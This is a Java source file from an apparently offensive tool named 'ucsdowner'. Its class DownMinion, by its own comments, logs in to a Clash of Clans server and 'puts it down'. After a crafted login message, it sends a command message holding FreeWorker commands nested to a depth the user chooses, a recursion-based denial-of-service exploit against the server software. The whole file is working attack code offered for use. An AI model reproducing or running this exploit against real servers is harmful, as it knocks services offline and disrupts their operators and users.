package io.redmoon.ucsdowner.minion;

import io.redmoon.helper.coc.Connection;
import io.redmoon.helper.coc.Message;
import io.redmoon.ucsdowner.UcsDownArguments;

/**
 * A down minion, as I like to call it. It logs in to the CoC server and puts it
 * down.
 * 
 * @note It can also be started as a Thread (hence the Runnable).
 * @author Benjamin
 */
public class DownMinion implements Runnable {
	private static final int LOGIN = 10101;
	private static final int HOME = 24101;
	private static final int COMMANDS = 14102;

	private static final int FREE_WORKER_CMD = 521;

	/**
	 * Creates a new instance of the down minion and runs it.
	 * 
	 * @param config
	 *            the configuration
	 */
	public static void start(UcsDownArguments config) {
		new DownMinion(config.getIp(), config.getRecursion()).run();
	}

	private String ip;
	private int recursion;

	/**
	 * Inits the down minion.
	 * 
	 * @param ip
	 * @param recursion
	 */
	public DownMinion(String ip, int recursion) {
		this.ip = ip;
		this.recursion = recursion;
	}

	/**
	 * Logs in and sends a crafted message.
	 * <p>
	 * The structure of the FreeWorkerCommand is as it follows:
	 * 
	 * <pre>
	 * 	 int timeLeft;
	 * 	 Command? toExecute;
	 * </pre>
	 * <p>
	 * The crafted message is basically a nested FreeWorker command into
	 * another, into another, into another <i>et catera</i>.
	 */
	public void run() {
		try {
			Connection connection = new Connection(ip);
			connection.send(new Message(LOGIN, (out) -> {
				out.putLong(0);
				out.putString(null);
				out.putInt(7);
				out.putInt(0);
				out.putInt(200);
				out.putString(" ");
				out.putString("");
				out.putString("");
				out.putString("");
				out.putString("");
				out.putInt(0);
				out.putString("en");

				out.putString("");
				out.putString("");
				out.put((byte) 1);
				out.putInt(0);
				out.putString("");
				out.putString("");
				out.put((byte) 1);
				out.putString("");
				out.putInt(0);

				out.put((byte) 0);
				out.putInt(0);
				out.putInt(0);
			} , 7));

			connection.waitFor(HOME);

			connection.send(new Message(COMMANDS, (out) -> {
				out.putInt(0);
				out.putInt(0);
				out.putInt(1);

				out.putInt(FREE_WORKER_CMD);
				out.putInt(0);
				out.putBoolean(true);
				for (int i = 0; i < recursion; i++) {
					out.putInt(FREE_WORKER_CMD);
					out.putInt(0);
					out.putBoolean(true);
				}
				out.putInt(FREE_WORKER_CMD);
				out.putInt(0);
				out.putBoolean(false);
			}));
			connection.disconnect();
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}
}
